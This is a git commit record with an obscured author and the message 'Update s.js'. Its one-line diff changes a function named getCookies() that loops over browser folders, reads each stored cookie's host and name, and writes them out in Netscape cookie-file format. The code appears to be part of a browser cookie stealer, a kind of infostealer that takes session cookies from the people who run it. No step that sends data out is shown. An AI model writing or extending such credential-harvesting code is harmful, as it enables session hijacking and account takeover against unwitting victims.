38b9bbc9a465b0925f9c5625b6de5d04d4c0157e
asiodhwiuahzujhbriawjykda <46265613+asiodhwiuahzujhbriawjykda@users.noreply.github.com>
2024-11-27 20:35:53 +0100

    Update s.js

--- s.js
+++ s.js
@@ -3718,7 +3718,7 @@ async function getCookies() {
                     }
 
                     cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
-                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
+                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${encryptedData} \n\n`
                     );
 
                     count.cookies++;
